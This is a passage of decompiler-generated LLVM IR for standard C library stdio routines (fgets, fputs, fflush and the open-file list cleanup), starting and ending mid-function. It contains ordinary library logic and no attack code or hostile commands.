  %v4_804b362 = inttoptr i32 %arg1 to i8*
  %v5_804b362 = call i32 @__GI_fgets_unlocked(i8* %v4_804b362, i32 %arg2, i32 %v0_804b359, i32 %v0_804b358)
  store i32 %v5_804b362, i32* %ebx.global-to-local, align 4
  br i1 %v1_804b337, label %dec_label_pc_804b381, label %dec_label_pc_804b370

dec_label_pc_804b370:                             ; preds = %dec_label_pc_804b358
  store i32 %v12_804b32b, i32* @eax, align 4
  %v2_804b379 = call i32 @__pthread_return_void(i32 %v12_804b32b, i32 1)
  %v0_804b384.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b381

dec_label_pc_804b381:                             ; preds = %dec_label_pc_804b358, %dec_label_pc_804b370
  %v0_804b384 = phi i32 [ %v5_804b362, %dec_label_pc_804b358 ], [ %v0_804b384.pre, %dec_label_pc_804b370 ]
  store i32 %v0_804b32a, i32* @ebx, align 4
  store i32 %v0_804b329, i32* @esi, align 4
  store i32 %v0_804b328, i32* @edi, align 4
  ret i32 %v0_804b384

; uselistorder directives
  uselistorder i32 %v12_804b32b, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804b381, { 1, 0 }
  uselistorder label %dec_label_pc_804b358, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804b38c = load i32, i32* @edi, align 4
  %v0_804b38d = load i32, i32* @esi, align 4
  %v0_804b38e = load i32, i32* @ebx, align 4
  %v12_804b38f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_804b396 = add i32 %arg2, 52
  %v2_804b396 = inttoptr i32 %v1_804b396 to i32*
  %v3_804b396 = load i32, i32* %v2_804b396, align 4
  store i32 %v3_804b396, i32* @edi, align 4
  %v1_804b399 = icmp eq i32 %v3_804b396, 0
  %v1_804b39b = icmp eq i1 %v1_804b399, false
  br i1 %v1_804b39b, label %entry.dec_label_pc_804b3bc_crit_edge, label %dec_label_pc_804b39d

entry.dec_label_pc_804b3bc_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804b3bc

dec_label_pc_804b39d:                             ; preds = %entry
  %v1_804b39d = add i32 %arg2, 56
  store i32 %v1_804b39d, i32* @ebx, align 4
  store i32 %v12_804b38f, i32* @eax, align 4
  %v2_804b3ac = call i32 @__pthread_return_void(i32 %v12_804b38f, i32 134535499)
  %v0_804b3b1 = load i32, i32* @ebx, align 4
  %v1_804b3b4 = call i32 @__pthread_return_0(i32 %v0_804b3b1)
  %v0_804b3be.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b3bc

dec_label_pc_804b3bc:                             ; preds = %entry.dec_label_pc_804b3bc_crit_edge, %dec_label_pc_804b39d
  %v0_804b3be = phi i32 [ %arg2, %entry.dec_label_pc_804b3bc_crit_edge ], [ %v0_804b3be.pre, %dec_label_pc_804b39d ]
  %v0_804b3bc = load i32, i32* @edx, align 4
  %v4_804b3c3 = inttoptr i32 %arg1 to i8*
  %v5_804b3c3 = call i32 @__GI_fputs_unlocked(i8* %v4_804b3c3, i32 %v0_804b3be, i32 %v0_804b3bc, i32 %v0_804b3bc)
  store i32 %v5_804b3c3, i32* %ebx.global-to-local, align 4
  br i1 %v1_804b39b, label %dec_label_pc_804b3e2, label %dec_label_pc_804b3d1

dec_label_pc_804b3d1:                             ; preds = %dec_label_pc_804b3bc
  store i32 %v12_804b38f, i32* @eax, align 4
  %v2_804b3da = call i32 @__pthread_return_void(i32 %v12_804b38f, i32 1)
  %v0_804b3e5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b3e2

dec_label_pc_804b3e2:                             ; preds = %dec_label_pc_804b3bc, %dec_label_pc_804b3d1
  %v0_804b3e5 = phi i32 [ %v5_804b3c3, %dec_label_pc_804b3bc ], [ %v0_804b3e5.pre, %dec_label_pc_804b3d1 ]
  store i32 %v0_804b38e, i32* @ebx, align 4
  store i32 %v0_804b38d, i32* @esi, align 4
  store i32 %v0_804b38c, i32* @edi, align 4
  ret i32 %v0_804b3e5

; uselistorder directives
  uselistorder i32 %v12_804b38f, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804b3e2, { 1, 0 }
  uselistorder label %dec_label_pc_804b3bc, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804b3fb = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b3fb, i32* @eax, align 4
  %v2_804b400 = call i32 @__pthread_return_void(i32 %v2_804b3fb, i32 134535499)
  %v1_804b40c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80534f0.313 to i32))
  %v0_804b411 = load i32, i32* @global_var_8053ba4.314, align 4
  %v8_804b419 = icmp eq i32 %v0_804b411, 1
  %v1_804b41a = icmp eq i1 %v8_804b419, false
  br i1 %v1_804b41a, label %dec_label_pc_804b4b1, label %dec_label_pc_804b420

dec_label_pc_804b420:                             ; preds = %entry
  %v0_804b420 = load i32, i32* @global_var_8053ba8.315, align 8
  %tmp29 = icmp slt i32 %v0_804b420, 1
  br i1 %tmp29, label %dec_label_pc_804b4b1, label %dec_label_pc_804b42d

dec_label_pc_804b42d:                             ; preds = %dec_label_pc_804b420
  store i32 0, i32* @esi, align 4
  %v2_804b43a = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804b43a, i32* @eax, align 4
  %v2_804b43f = call i32 @__pthread_return_void(i32 %v2_804b43a, i32 134535499)
  %v1_804b44b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80534d8.317 to i32))
  %v0_804b450 = load i32, i32* bitcast (i32** @global_var_80534d4.318 to i32*), align 4
  store i32 %v0_804b450, i32* %edx.global-to-local, align 4
  %v1_804b4923 = icmp eq i32 %v0_804b450, 0
  %v1_804b49410 = icmp eq i1 %v1_804b4923, false
  br i1 %v1_804b49410, label %dec_label_pc_804b45b, label %dec_label_pc_804b496

dec_label_pc_804b45b:                             ; preds = %dec_label_pc_804b42d, %dec_label_pc_804b490
  %v1_804b45b14.in = phi i32 [ %v0_804b490, %dec_label_pc_804b490 ], [ %v0_804b450, %dec_label_pc_804b42d ]
  %v1_804b45b14 = inttoptr i32 %v1_804b45b14.in to i16*
  %v2_804b45b = load i16, i16* %v1_804b45b14, align 2
  %v1_804b45e = add i32 %v1_804b45b14.in, 32
  %v2_804b45e = inttoptr i32 %v1_804b45e to i32*
  %v3_804b45e = load i32, i32* %v2_804b45e, align 4
  store i32 %v3_804b45e, i32* @ebx, align 4
  %v1_804b461 = and i16 %v2_804b45b, -32720
  %v6_804b466 = icmp eq i16 %v1_804b461, 48
  br i1 %v6_804b466, label %dec_label_pc_804b46f, label %dec_label_pc_804b46b

dec_label_pc_804b46b:                             ; preds = %dec_label_pc_804b45b
  store i32 %v1_804b45b14.in, i32* @esi, align 4
  br label %dec_label_pc_804b490

dec_label_pc_804b46f:                             ; preds = %dec_label_pc_804b45b
  %v0_804b46f = load i32, i32* @esi, align 4
  %v1_804b46f = icmp eq i32 %v0_804b46f, 0
  %v1_804b471 = icmp eq i1 %v1_804b46f, false
  br i1 %v1_804b471, label %dec_label_pc_804b47b, label %dec_label_pc_804b473

dec_label_pc_804b473:                             ; preds = %dec_label_pc_804b46f
  store i32 %v3_804b45e, i32* bitcast (i32** @global_var_80534d4.318 to i32*), align 4
  br label %dec_label_pc_804b47e

dec_label_pc_804b47b:                             ; preds = %dec_label_pc_804b46f
  %v2_804b47b = add i32 %v0_804b46f, 32
  %v3_804b47b = inttoptr i32 %v2_804b47b to i32*
  store i32 %v3_804b45e, i32* %v3_804b47b, align 4
  %v0_804b47e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b47e

dec_label_pc_804b47e:                             ; preds = %dec_label_pc_804b473, %dec_label_pc_804b47b
  %v0_804b487 = phi i32 [ %v1_804b45b14.in, %dec_label_pc_804b473 ], [ %v0_804b47e.pre, %dec_label_pc_804b47b ]
  %v1_804b47e = add i32 %v0_804b487, 1
  %v2_804b47e = inttoptr i32 %v1_804b47e to i8*
  %v3_804b47e = load i8, i8* %v2_804b47e, align 1
  %v4_804b47e = and i8 %v3_804b47e, 32
  %v5_804b47e = icmp eq i8 %v4_804b47e, 0
  br i1 %v5_804b47e, label %dec_label_pc_804b490, label %dec_label_pc_804b484

dec_label_pc_804b484:                             ; preds = %dec_label_pc_804b47e
  %v1_804b488 = call i32 @free(i32 %v0_804b487)
  br label %dec_label_pc_804b490

dec_label_pc_804b490:                             ; preds = %dec_label_pc_804b47e, %dec_label_pc_804b46b, %dec_label_pc_804b484
  %v0_804b490 = load i32, i32* @ebx, align 4
  store i32 %v0_804b490, i32* %edx.global-to-local, align 4
  %v1_804b492 = icmp eq i32 %v0_804b490, 0
  %v1_804b494 = icmp eq i1 %v1_804b492, false
  br i1 %v1_804b494, label %dec_label_pc_804b45b, label %dec_label_pc_804b496

dec_label_pc_804b496:                             ; preds = %dec_label_pc_804b490, %dec_label_pc_804b42d
  store i32 %v2_804b43a, i32* @eax, align 4
  %v2_804b49f = call i32 @__pthread_return_void(i32 %v2_804b43a, i32 1)
  store i32 0, i32* @global_var_8053ba8.315, align 8
  %v0_804b4b1.pre = load i32, i32* @global_var_8053ba4.314, align 4
  br label %dec_label_pc_804b4b1

dec_label_pc_804b4b1:                             ; preds = %dec_label_pc_804b420, %entry, %dec_label_pc_804b496
  %v0_804b4b1 = phi i32 [ %v0_804b411, %dec_label_pc_804b420 ], [ %v0_804b411, %entry ], [ %v0_804b4b1.pre, %dec_label_pc_804b496 ]
  %v1_804b4b6 = add i32 %v0_804b4b1, -1
  store i32 %v1_804b4b6, i32* @global_var_8053ba4.314, align 4
  store i32 %v2_804b3fb, i32* @eax, align 4
  %v2_804b4c5 = call i32 @__pthread_return_void(i32 %v2_804b3fb, i32 1)
  ret i32 %v2_804b4c5

; uselistorder directives
  uselistorder i32 %v0_804b490, { 1, 2, 0 }
  uselistorder i32 %v1_804b45b14.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804b411, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804b4b1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b490, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b47e, { 1, 0 }
  uselistorder label %dec_label_pc_804b45b, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804b4d0 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_804b4d3 = load i32, i32* @edi, align 4
  %v0_804b4d4 = load i32, i32* @esi, align 4
  %v0_804b4d5 = load i32, i32* @ebx, align 4
  %v4_804b4d9 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804b4d9, i32* @ebx, align 4
  %v10_804b4dd = icmp eq i16* %arg1, inttoptr (i32 134558932 to i16*)
  br i1 %v10_804b4dd, label %dec_label_pc_804b4f1, label %dec_label_pc_804b4e5

dec_label_pc_804b4e5:                             ; preds = %entry
  %v2_804b4e5 = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_804b4eb = icmp eq i1 %v2_804b4e5, false
  br i1 %v1_804b4eb, label %dec_label_pc_804b5e9, label %dec_label_pc_804b4f1

dec_label_pc_804b4f1:                             ; preds = %dec_label_pc_804b4e5, %entry
  store i32 0, i32* @edi, align 4
  %v2_804b4fe = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804b4fe, i32* @ebx, align 4
  %v2_804b503 = call i32 @__pthread_return_void(i32 %v2_804b4fe, i32 134535499)
  %v1_804b50f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80534f0.313 to i32))
  %v0_804b514 = load i32, i32* @global_var_8053ba4.314, align 4
  store i32 ptrtoint (i32* @global_var_80534f0.313 to i32), i32* @ecx, align 4
  %v1_804b51b = add i32 %v0_804b514, 1
  store i32 %v1_804b51b, i32* @eax, align 4
  store i32 %v1_804b51b, i32* @global_var_8053ba4.314, align 4
  %v2_804b524 = call i32 @__pthread_return_void(i32 %v2_804b4fe, i32 1)
  store i32 %v2_804b524, i32* @eax, align 4
  %v2_804b537 = call i32 @__pthread_return_void(i32 %v2_804b4fe, i32 134535499)
  %v1_804b543 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80534d8.317 to i32))
  %v0_804b548 = load i32, i32* bitcast (i32** @global_var_80534d4.318 to i32*), align 4
  store i32 %v0_804b548, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_80534d8.317 to i32), i32* @eax, align 4
  %v2_804b553 = call i32 @__pthread_return_void(i32 %v2_804b4fe, i32 1)
  %v0_804b5da1 = load i32, i32* @esi, align 4
  %v1_804b5da2 = icmp eq i32 %v0_804b5da1, 0
  %v1_804b5dc9 = icmp eq i1 %v1_804b5da2, false
  br i1 %v1_804b5dc9, label %dec_label_pc_804b55d, label %dec_label_pc_804b5e2

dec_label_pc_804b55d:                             ; preds = %dec_label_pc_804b4f1, %dec_label_pc_804b5d7
  %v0_804b56b = phi i32 [ %v3_804b5d7, %dec_label_pc_804b5d7 ], [ %v0_804b5da1, %dec_label_pc_804b4f1 ]
  %v1_804b55d = inttoptr i32 %v0_804b56b to i8*
  %v2_804b55d = load i8, i8* %v1_804b55d, align 1
  %v3_804b55d = and i8 %v2_804b55d, 64
  %v4_804b55d = icmp eq i8 %v3_804b55d, 0
  br i1 %v4_804b55d, label %dec_label_pc_804b5d7, label %dec_label_pc_804b562

dec_label_pc_804b562:                             ; preds = %dec_label_pc_804b55d
  %v0_804b562 = load i32, i32* @global_var_8053508.316, align 8
  %v9_804b562 = icmp eq i32 %v0_804b562, 2
  br i1 %v9_804b562, label %dec_label_pc_804b58a, label %dec_label_pc_804b56b

dec_label_pc_804b56b:                             ; preds = %dec_label_pc_804b562
  %v1_804b56b = add i32 %v0_804b56b, 56
  store i32 %v1_804b56b, i32* @ebx, align 4
  store i32 %v2_804b4fe, i32* @eax, align 4
  %v2_804b57a = call i32 @__pthread_return_void(i32 %v2_804b4fe, i32 134535499)
  %v0_804b57f = load i32, i32* @ebx, align 4
  %v1_804b582 = call i32 @__pthread_return_0(i32 %v0_804b57f)
  %v0_804b58a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b58a

dec_label_pc_804b58a:                             ; preds = %dec_label_pc_804b562, %dec_label_pc_804b56b
  %v0_804b59d = phi i32 [ %v0_804b56b, %dec_label_pc_804b562 ], [ %v0_804b58a.pre, %dec_label_pc_804b56b ]
  %v1_804b58a = inttoptr i32 %v0_804b59d to i32*
  %v2_804b58a = load i32, i32* %v1_804b58a, align 4
  %v1_804b58c = load i32, i32* @ebp, align 4
  %v2_804b58c = or i32 %v1_804b58c, %v2_804b58a
  %v1_804b58e = and i32 %v2_804b58c, 832
  %v2_804b593 = icmp eq i32 %v1_804b58e, 320
  %v1_804b598 = icmp eq i1 %v2_804b593, false
  br i1 %v1_804b598, label %dec_label_pc_804b5bd, label %dec_label_pc_804b59a

dec_label_pc_804b59a:                             ; preds = %dec_label_pc_804b58a
  %v1_804b59e = call i32 @__stdio_wcommit(i32 %v0_804b59d)
  %v1_804b5a6 = icmp eq i32 %v1_804b59e, 0
  br i1 %v1_804b5a6, label %dec_label_pc_804b5af, label %dec_label_pc_804b5aa

dec_label_pc_804b5aa:                             ; preds = %dec_label_pc_804b59a
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804b5bd

dec_label_pc_804b5af:                             ; preds = %dec_label_pc_804b59a
  %v0_804b5af = load i32, i32* @esi, align 4
  %v1_804b5af = add i32 %v0_804b5af, 8
  %v2_804b5af = inttoptr i32 %v1_804b5af to i32*
  %v3_804b5af = load i32, i32* %v2_804b5af, align 4
  %v2_804b5b2 = add i32 %v0_804b5af, 28
  %v3_804b5b2 = inttoptr i32 %v2_804b5b2 to i32*
  store i32 %v3_804b5af, i32* %v3_804b5b2, align 4
  %v0_804b5b5 = load i32, i32* @esi, align 4
  %v1_804b5b5 = inttoptr i32 %v0_804b5b5 to i32*
  %v2_804b5b5 = load i32, i32* %v1_804b5b5, align 4
  %v2_804b5b5.tr = trunc i32 %v2_804b5b5 to i16
  %v1_804b5ba = and i16 %v2_804b5b5.tr, -65
  %v3_804b5ba = inttoptr i32 %v0_804b5b5 to i16*
  store i16 %v1_804b5ba, i16* %v3_804b5ba, align 2
  br label %dec_label_pc_804b5bd

dec_label_pc_804b5bd:                             ; preds = %dec_label_pc_804b58a, %dec_label_pc_804b5aa, %dec_label_pc_804b5af
  %v0_804b5bd = load i32, i32* @global_var_8053508.316, align 8
  %v9_804b5bd = icmp eq i32 %v0_804b5bd, 2
  br i1 %v9_804b5bd, label %dec_label_pc_804b5d7, label %dec_label_pc_804b5c6

dec_label_pc_804b5c6:                             ; preds = %dec_label_pc_804b5bd
  store i32 %v2_804b4fe, i32* @eax, align 4
  %v2_804b5cf = call i32 @__pthread_return_void(i32 %v2_804b4fe, i32 1)
  br label %dec_label_pc_804b5d7

dec_label_pc_804b5d7:                             ; preds = %dec_label_pc_804b5bd, %dec_label_pc_804b55d, %dec_label_pc_804b5c6
  %v0_804b5d7 = load i32, i32* @esi, align 4
  %v1_804b5d7 = add i32 %v0_804b5d7, 32
  %v2_804b5d7 = inttoptr i32 %v1_804b5d7 to i32*
  %v3_804b5d7 = load i32, i32* %v2_804b5d7, align 4
  store i32 %v3_804b5d7, i32* @esi, align 4
  %v1_804b5da = icmp eq i32 %v3_804b5d7, 0
  %v1_804b5dc = icmp eq i1 %v1_804b5da, false
  br i1 %v1_804b5dc, label %dec_label_pc_804b55d, label %dec_label_pc_804b5e2

dec_label_pc_804b5e2:                             ; preds = %dec_label_pc_804b5d7, %dec_label_pc_804b4f1
  %v0_804b5e2 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_804b613

dec_label_pc_804b5e9:                             ; preds = %dec_label_pc_804b4e5
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804b5eb = load i8, i8* %tmp23, align 1
  %v4_804b5eb = and i8 %v3_804b5eb, 64
  %v5_804b5eb = icmp eq i8 %v4_804b5eb, 0
  br i1 %v5_804b5eb, label %dec_label_pc_804b613, label %dec_label_pc_804b5f0

dec_label_pc_804b5f0:                             ; preds = %dec_label_pc_804b5e9
  store i32 -1, i32* @edi, align 4
  %v1_804b5f7 = call i32 @__stdio_wcommit(i32 %v4_804b4d9)
  %v1_804b5ff = icmp eq i32 %v1_804b5f7, 0
  %v1_804b601 = icmp eq i1 %v1_804b5ff, false
  br i1 %v1_804b601, label %dec_label_pc_804b613, label %dec_label_pc_804b603

dec_label_pc_804b603:                             ; preds = %dec_label_pc_804b5f0
  %v2_804b603 = add i32 %v4_804b4d9, 8
  %v3_804b603 = inttoptr i32 %v2_804b603 to i32*
  %v4_804b603 = load i32, i32* %v3_804b603, align 4
  store i32 0, i32* @edi, align 4
  %v3_804b608 = add i32 %v4_804b4d9, 28
  %v4_804b608 = inttoptr i32 %v3_804b608 to i32*
  store i32 %v4_804b603, i32* %v4_804b608, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_804b60b = load i32, i32* %tmp24, align 4
  %v3_804b60b.tr = trunc i32 %v3_804b60b to i16
  %v1_804b610 = and i16 %v3_804b60b.tr, -65
  store i16 %v1_804b610, i16* %arg1, align 2
  br label %dec_label_pc_804b613

dec_label_pc_804b613:                             ; preds = %dec_label_pc_804b5f0, %dec_label_pc_804b5e9, %dec_label_pc_804b5e2, %dec_label_pc_804b603
  %v0_804b616 = load i32, i32* @edi, align 4
  store i32 %v0_804b4d5, i32* @ebx, align 4
  store i32 %v0_804b4d4, i32* @esi, align 4
  store i32 %v0_804b4d3, i32* @edi, align 4
  store i32 %v0_804b4d0, i32* @ebp, align 4
  ret i32 %v0_804b616

; uselistorder directives
  uselistorder i32 %v3_804b5d7, { 1, 2, 0 }
  uselistorder i32 %v2_804b4fe, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_80534d4.318 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_8053ba4.314, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_80534f0.313 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_804b613, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804b5d7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b5bd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b58a, { 1, 0 }
  uselistorder label %dec_label_pc_804b55d, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804b620 = load i32, i32* @ebp, align 4
  %v4_804b62b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b62b, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804b62b, i32* @ebx, align 4
  %tmp16 = icmp slt i32 %arg2, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_804b671.preheader, label %dec_label_pc_804b67d

dec_label_pc_804b671.preheader:                   ; preds = %entry
  %v1_804b67118 = add i32 %arg2, -1
  %v8_804b67122 = icmp eq i32 %v1_804b67118, 0
  store i32 %v1_804b67118, i32* @esi, align 4
  %v1_804b67224 = icmp eq i1 %v8_804b67122, false
  br i1 %v1_804b67224, label %dec_label_pc_804b63b, label %dec_label_pc_804b674

dec_label_pc_804b63b:                             ; preds = %dec_label_pc_804b671.preheader, %dec_label_pc_804b66f.dec_label_pc_804b671_crit_edge.dec_label_pc_804b63b_crit_edge
  %v0_804b63b = phi i32 [ %v0_804b63b.pre, %dec_label_pc_804b66f.dec_label_pc_804b671_crit_edge.dec_label_pc_804b63b_crit_edge ], [ %arg3, %dec_label_pc_804b671.preheader ]
  %v1_804b63b = add i32 %v0_804b63b, 16
  %v2_804b63b = inttoptr i32 %v1_804b63b to i32*
  %v3_804b63b = load i32, i32* %v2_804b63b, align 4
  store i32 %v3_804b63b, i32* %eax.global-to-local, align 4
  %v2_804b63e = add i32 %v0_804b63b, 24
  %v3_804b63e = inttoptr i32 %v2_804b63e to i32*
  %v4_804b63e = load i32, i32* %v3_804b63e, align 4
  %v10_804b63e = icmp ult i32 %v3_804b63b, %v4_804b63e
  %v1_804b641 = icmp eq i1 %v10_804b63e, false
  br i1 %v1_804b641, label %dec_label_pc_804b651, label %dec_label_pc_804b643

dec_label_pc_804b643:                             ; preds = %dec_label_pc_804b63b
  %v1_804b643 = inttoptr i32 %v3_804b63b to i8*
  %v2_804b643 = load i8, i8* %v1_804b643, align 1
  %v3_804b643 = zext i8 %v2_804b643 to i32
  %v4_804b643 = load i32, i32* @edx, align 4
  %v5_804b643 = and i32 %v4_804b643, -256
  %v6_804b643 = or i32 %v5_804b643, %v3_804b643
  store i32 %v6_804b643, i32* @edx, align 4
  %v1_804b645 = add i32 %v3_804b63b, 1
  store i32 %v1_804b645, i32* %eax.global-to-local, align 4
  %v2_804b646 = load i32, i32* @ebx, align 4
  %v3_804b646 = inttoptr i32 %v2_804b646 to i8*
  store i8 %v2_804b643, i8* %v3_804b646, align 1
  %v0_804b648 = load i32, i32* @ebx, align 4
  %v1_804b648 = add i32 %v0_804b648, 1
  store i32 %v1_804b648, i32* @ebx, align 4
  %v0_804b649 = load i32, i32* @edx, align 4
  %v1_804b649 = trunc i32 %v0_804b649 to i8
  %v10_804b649 = icmp eq i8 %v1_804b649, 10
  %v0_804b64c = load i32, i32* %eax.global-to-local, align 4
  %v1_804b64c = load i32, i32* @ebp, align 4
  %v2_804b64c = add i32 %v1_804b64c, 16
  %v3_804b64c = inttoptr i32 %v2_804b64c to i32*
  store i32 %v0_804b64c, i32* %v3_804b64c, align 4
  br i1 %v10_804b649, label %dec_label_pc_804b674, label %dec_label_pc_804b66f.dec_label_pc_804b671_crit_edge

dec_label_pc_804b651:                             ; preds = %dec_label_pc_804b63b
  %v0_804b655 = call i32 @getc_unlocked()
  %v1_804b655 = trunc i32 %v0_804b655 to i8
  store i32 %v0_804b655, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_804b655, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_804b660 = icmp eq i1 %tmp, false
  br i1 %v1_804b660, label %dec_label_pc_804b66f, label %dec_label_pc_804b662

dec_label_pc_804b662:                             ; preds = %dec_label_pc_804b651
  %v0_804b662 = load i32, i32* @ebp, align 4
  %v1_804b662 = inttoptr i32 %v0_804b662 to i8*
  %v2_804b662 = load i8, i8* %v1_804b662, align 1
  %v3_804b662 = and i8 %v2_804b662, 8
  %v4_804b662 = icmp eq i8 %v3_804b662, 0
  br i1 %v4_804b662, label %dec_label_pc_804b674, label %dec_label_pc_804b67d

dec_label_pc_804b66f:                             ; preds = %dec_label_pc_804b651
  %v3_804b66a = load i32, i32* @ebx, align 4
  %v4_804b66a = inttoptr i32 %v3_804b66a to i8*
  store i8 %v1_804b655, i8* %v4_804b66a, align 1
  %v0_804b66c = load i32, i32* @ebx, align 4
  %v1_804b66c = add i32 %v0_804b66c, 1
  store i32 %v1_804b66c, i32* @ebx, align 4
  %v11_804b66d = icmp eq i8 %v1_804b655, 10
  br i1 %v11_804b66d, label %dec_label_pc_804b674, label %dec_label_pc_804b66f.dec_label_pc_804b671_crit_edge

dec_label_pc_804b66f.dec_label_pc_804b671_crit_edge: ; preds = %dec_label_pc_804b643, %dec_label_pc_804b66f
  %v0_804b671.pre = load i32, i32* @esi, align 4
  %v1_804b671 = add i32 %v0_804b671.pre, -1
  %v8_804b671 = icmp eq i32 %v1_804b671, 0
  store i32 %v1_804b671, i32* @esi, align 4
  %v1_804b672 = icmp eq i1 %v8_804b671, false
  br i1 %v1_804b672, label %dec_label_pc_804b66f.dec_label_pc_804b671_crit_edge.dec_label_pc_804b63b_crit_edge, label %dec_label_pc_804b674

dec_label_pc_804b66f.dec_label_pc_804b671_crit_edge.dec_label_pc_804b63b_crit_edge: ; preds = %dec_label_pc_804b66f.dec_label_pc_804b671_crit_edge
  %v0_804b63b.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804b63b

dec_label_pc_804b674:                             ; preds = %dec_label_pc_804b671.preheader, %dec_label_pc_804b643, %dec_label_pc_804b66f.dec_label_pc_804b671_crit_edge, %dec_label_pc_804b66f, %dec_label_pc_804b662
  %v0_804b674 = load i32, i32* @ebx, align 4
  %v1_804b674 = load i32, i32* @edi, align 4
  %tmp26 = icmp ugt i32 %v0_804b674, %v1_804b674
  br i1 %tmp26, label %dec_label_pc_804b678, label %dec_label_pc_804b67d

dec_label_pc_804b678:                             ; preds = %dec_label_pc_804b674
  %v1_804b678 = inttoptr i32 %v0_804b674 to i8*
  store i8 0, i8* %v1_804b678, align 1
  %v0_804b682.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804b67f

dec_label_pc_804b67d:                             ; preds = %dec_label_pc_804b674, %dec_label_pc_804b662, %entry
  br label %dec_label_pc_804b67f

dec_label_pc_804b67f:                             ; preds = %dec_label_pc_804b678, %dec_label_pc_804b67d
  %v0_804b682 = phi i32 [ %v0_804b682.pre, %dec_label_pc_804b678 ], [ 0, %dec_label_pc_804b67d ]
  store i32 %v0_804b682, i32* %eax.global-to-local, align 4
  store i32 %v0_804b620, i32* @ebp, align 4
  ret i32 %v0_804b682

; uselistorder directives
  uselistorder i32 %v0_804b682, { 1, 0 }
  uselistorder i32 %v0_804b674, { 1, 0 }
  uselistorder i32 %v1_804b671, { 1, 0 }
  uselistorder i32 %v0_804b655, { 0, 2, 1 }
  uselistorder i32 %v0_804b63b, { 1, 0 }
  uselistorder label %dec_label_pc_804b67f, { 1, 0 }
  uselistorder label %dec_label_pc_804b674, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_804b66f.dec_label_pc_804b671_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804b63b, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804b68c = load i32, i32* @esi, align 4
  %v0_804b68d = load i32, i32* @ebx, align 4
  store i32 %v0_804b68d, i32* %stack_var_-8, align 4
  %v4_804b691 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b691, i32* @ebx, align 4
  %v3_804b696 = call i32 @strlen(i8* %arg1)
  store i32 %v3_804b696, i32* @esi, align 4
  %v0_804b6a7 = load i32, i32* @ebx, align 4
  %v6_804b6a8 = call i32 @__GI_fwrite_unlocked(i32 %v0_804b6a7, i64 1, i32 %v3_804b696, i32 %arg2)
  %v1_804b6b2 = load i32, i32* @esi, align 4
  %v12_804b6b2 = icmp eq i32 %v6_804b6a8, %v1_804b6b2
  %v3_804b6b4 = select i1 %v12_804b6b2, i32 %v6_804b6a8, i32 -1
  %v2_804b6ba = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b6ba, i32* @ebx, align 4
  store i32 %v0_804b68c, i32* @esi, align 4
  ret i32 %v3_804b6b4

; uselistorder directives
